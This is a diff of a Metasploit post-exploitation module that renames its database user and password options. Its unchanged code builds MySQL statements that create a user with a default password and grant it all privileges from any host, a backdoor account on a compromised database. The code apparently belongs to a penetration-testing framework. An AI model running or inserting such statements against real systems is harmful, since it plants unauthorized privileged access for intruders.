@@ -39,8 +39,8 @@ class MetasploitModule < Msf::Post
     register_options(
       [
         OptString.new('DBALIAS', [true, 'Use dbvis_enum module to find out databases and aliases', 'localhost']),
-        OptString.new('DBUSERNAME', [true, 'The user you want to add to the remote database', 'msf']),
-        OptString.new('DBPASSWORD', [true, 'User password to set', 'msfRocks'])
+        OptString.new('DBUSER', [true, 'The user you want to add to the remote database', 'msf']),
+        OptString.new('DBPASS', [true, 'User password to set', 'msfRocks'])
       ]
     )
   end
@@ -55,7 +55,7 @@ class MetasploitModule < Msf::Post
         if errors == true
           print_error('No luck today, access is probably denied for configured user !? Try in verbose mode to know what happened. ')
         else
-          print_good("Privileged user created ! Try now to connect with user : #{datastore['DBUSERNAME']} and password : #{datastore['DBPASSWORD']}")
+          print_good("Privileged user created ! Try now to connect with user : #{datastore['DBUSER']} and password : #{datastore['DBPASS']}")
         end
       end
     end
@@ -232,11 +232,11 @@ class MetasploitModule < Msf::Post
   # Build proper sql
   def get_sql(db_type)
     if db_type =~ /mysql/i
-      sql = "CREATE USER '#{datastore['DBUSERNAME']}'@'localhost' IDENTIFIED BY '#{datastore['DBPASSWORD']}';"
-      sql << "GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSERNAME']}'@'localhost' WITH GRANT OPTION;"
+      sql = "CREATE USER '#{datastore['DBUSER']}'@'localhost' IDENTIFIED BY '#{datastore['DBPASS']}';"
+      sql << "GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSER']}'@'localhost' WITH GRANT OPTION;"
 
-      sql << "CREATE USER '#{datastore['DBUSERNAME']}'@'%' IDENTIFIED BY '#{datastore['DBPASSWORD']}';"
-      sql << "GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSERNAME']}'@'%' WITH GRANT OPTION;"
+      sql << "CREATE USER '#{datastore['DBUSER']}'@'%' IDENTIFIED BY '#{datastore['DBPASS']}';"
+      sql << "GRANT ALL PRIVILEGES ON *.* TO '#{datastore['DBUSER']}'@'%' WITH GRANT OPTION;"
       return sql
     end
     return nil
